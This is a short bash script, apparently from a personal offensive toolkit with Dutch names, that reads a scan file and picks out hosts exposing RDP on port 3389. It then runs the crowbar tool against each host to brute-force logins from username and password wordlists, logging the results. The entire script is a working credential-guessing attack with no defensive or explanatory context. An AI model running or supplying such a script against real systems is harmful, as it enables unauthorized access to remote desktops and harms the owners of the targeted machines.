#!/usr/bin/env bash

source meuk/globalmeuk.sh

scanfile=${1:-}

if [ -z "$scanfile" ]; then
  echo "naam?"
  exit;
fi

result=$(sh -c "./search.sh ${scanfile} 3389")

for xhost in $result; do
  echo "[+] RDP on ${xhost}"
  crowbar -b rdp -s ${xhost}/32 -u /meuk/wordlists/users.txt -C meuk/wordlists/passwords.txt -l meuk/logs/crowbar_vpn_${DATUM}.log

done